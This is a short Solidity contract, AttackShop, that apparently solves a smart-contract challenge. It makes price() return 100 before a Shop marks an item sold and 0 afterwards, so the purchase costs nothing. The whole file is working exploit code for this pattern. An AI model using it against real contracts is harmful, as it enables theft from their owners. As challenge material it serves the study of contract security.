// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./shop.sol";

contract AttackShop is Buyer{

    Shop public shop;

    constructor(Shop _shop) public{
        shop = _shop;
    }

    function buy() public{
        shop.buy();
    }

    function price() public view override returns(uint){
        return shop.isSold() ? 0 : 100; // Return 100 if False; Return 0 if True
    }
}
